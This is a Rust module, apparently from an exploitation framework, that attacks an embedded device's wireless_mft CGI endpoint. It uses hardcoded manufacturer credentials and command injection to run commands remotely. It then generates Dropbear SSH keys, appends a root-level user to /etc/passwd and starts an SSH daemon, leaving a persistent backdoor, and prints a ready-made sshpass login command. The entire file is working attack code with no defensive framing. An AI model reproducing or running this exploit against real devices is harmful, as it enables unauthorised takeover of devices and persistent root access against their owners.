use anyhow::{Result};
use reqwest::Client;
use std::io::{self, Write};
use md5;

/// // Send a command using the vulnerable RCE endpoint
async fn exploit_rce(client: &Client, target: &str, cmd: &str) -> Result<()> {
    let url = format!(
        "http://manufacture:erutcafunam@{}/cgi-bin/mft/wireless_mft?ap=inject;{}",
        target, cmd
    );
    println!("[*] Sending RCE payload: {}", cmd);

    let resp = client.get(&url).send().await?;
    let status = resp.status();
    let body = resp.text().await?;

    println!("[+] Status: {}", status);
    println!("[+] Response:\n{}", body);

    Ok(())
}

/// // Generate Dropbear SSH keys on the target system
async fn generate_ssh_key(client: &Client, target: &str) -> Result<()> {
    let cmd = "/etc/dropbear/dropbearkey%20-t%20rsa%20-f%20/etc/dropbear/dropbear_rsa_host_key";
    println!("[*] Generating Dropbear SSH key...");
    exploit_rce(client, target, cmd).await
}

/// // Inject a root user with a hashed password into /etc/passwd
async fn inject_root_user(client: &Client, target: &str, user: &str, hash: &str) -> Result<()> {
    let payload = format!(
        "echo%20{}:{}:0:0:root:/:/bin/sh%20>>%20/etc/passwd",
        user, hash
    );
    println!("[*] Injecting user '{}' with root privileges...", user);
    exploit_rce(client, target, &payload).await
}

/// // Start Dropbear SSH daemon
async fn start_dropbear(client: &Client, target: &str) -> Result<()> {
    let cmd = "/etc/dropbear/dropbear%20-E%20-F";
    println!("[*] Starting Dropbear SSH daemon...");
    exploit_rce(client, target, cmd).await
}

/// // Generate simple MD5(password) as hash for dropbear user
fn generate_md5_hash(password: &str) -> String {
    let digest = md5::compute(password.as_bytes());
    format!("{:x}", digest)
}

/// // Interactive shell logic
async fn execute(target: &str) -> Result<()> {
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    println!("[*] Dropbear SSH persistence for target: {}", target);

    print!("Enter username to inject: ");
    io::stdout().flush()?;
    let mut user = String::new();
    io::stdin().read_line(&mut user)?;
    let user = user.trim();

    print!("Enter password (will be hashed): ");
    io::stdout().flush()?;
    let mut pass = String::new();
    io::stdin().read_line(&mut pass)?;
    let pass = pass.trim();

    let hash = generate_md5_hash(pass);
    println!("[*] Generated hash: {}", hash);

    generate_ssh_key(&client, target).await?;
    inject_root_user(&client, target, user, &hash).await?;
    start_dropbear(&client, target).await?;

    println!("\n[+] Done. Try connecting with:");
    println!(
        "    sshpass -p '{}' ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa {}@{}",
        pass, user, target
    );

    Ok(())
}

/// // Dispatcher entrypoint
pub async fn run(target: &str) -> Result<()> {
    execute(target).await
}
